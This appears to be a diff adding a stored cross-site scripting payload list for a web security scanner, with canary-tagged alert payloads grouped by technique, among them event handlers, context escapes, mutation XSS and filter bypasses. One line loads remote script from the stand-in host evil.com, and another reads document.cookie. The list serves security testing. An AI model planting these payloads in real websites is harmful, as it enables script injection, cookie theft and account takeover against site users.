@@ -1,0 +1,74 @@
+# Stored XSS Payloads
+# Designed for persistent contexts (comments, profiles, messages, forms)
+
+# === Basic Tags ===
+<script>alert('{{CANARY}}')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script src=//evil.com></script>
+
+# === Event Handlers ===
+<img src=x onerror=alert('{{CANARY}}')>
+<svg onload=alert('{{CANARY}}')>
+<iframe src="javascript:alert('{{CANARY}}')">
+<details open ontoggle=alert('{{CANARY}}')>
+<input onfocus=alert('{{CANARY}}') autofocus>
+<marquee onstart=alert('{{CANARY}}')>
+<video src=x onerror=alert('{{CANARY}}')>
+<audio src=x onerror=alert('{{CANARY}}')>
+<body onload=alert('{{CANARY}}')>
+<embed src="javascript:alert('{{CANARY}}')">
+<object data="javascript:alert('{{CANARY}}')">
+
+# === Tag Breaking / Context Escape ===
+"><script>alert('{{CANARY}}')</script>
+'><script>alert('{{CANARY}}')</script>
+</textarea><script>alert('{{CANARY}}')</script>
+</title><script>alert('{{CANARY}}')</script>
+</style><script>alert('{{CANARY}}')</script>
+
+# === Attribute Injection ===
+" onmouseover="alert('{{CANARY}}')" x="
+" onfocus="alert('{{CANARY}}')" autofocus x="
+' onmouseover='alert(1)' x='
+"><img src=x onerror=alert('{{CANARY}}')>
+
+# === Markdown/BBCode Injection ===
+[url=javascript:alert('{{CANARY}}')]click[/url]
+[img]javascript:alert('{{CANARY}}')[/img]
+![img](x" onerror="alert('{{CANARY}}'))
+[Click me](javascript:alert('{{CANARY}}'))
+
+# === Rich Text / WYSIWYG Bypasses ===
+<div style="background:url(javascript:alert('{{CANARY}}'))">
+<link rel=stylesheet href="data:,*{x:expression(alert('{{CANARY}}'))}">
+<style>*{background:url(javascript:alert('{{CANARY}}'))}</style>
+
+# === Stored via User-Agent / Headers ===
+<script>alert('{{CANARY}}')</script>
+<img src=x onerror=alert('{{CANARY}}')>
+
+# === SVG File Upload XSS ===
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('{{CANARY}}')"/>
+<svg><script>alert('{{CANARY}}')</script></svg>
+
+# === Mutation XSS (mXSS) ===
+<listing>&lt;img src=1 onerror=alert('{{CANARY}}')&gt;</listing>
+<noscript><p title="</noscript><img src=x onerror=alert('{{CANARY}}')>">
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('{{CANARY}}')>
+
+# === Filter Bypass ===
+<scr<script>ipt>alert('{{CANARY}}')</scr</script>ipt>
+<ScRiPt>alert('{{CANARY}}')</ScRiPt>
+<IMG SRC=x ONERROR=alert('{{CANARY}}')>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;{{CANARY}}&#39;&#41;>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+# === Persistent DOM Manipulation ===
+<div id=x tabindex=1 onfocus=alert('{{CANARY}}')></div>
+<x contenteditable onblur=alert('{{CANARY}}')>click and blur</x>
+<x tabindex=1 onfocus=alert('{{CANARY}}') autofocus></x>
+
+# === JSON Injection (API stored XSS) ===
+{"name":"<script>alert('{{CANARY}}')</script>"}
+{"bio":"<img src=x onerror=alert('{{CANARY}}')>"}
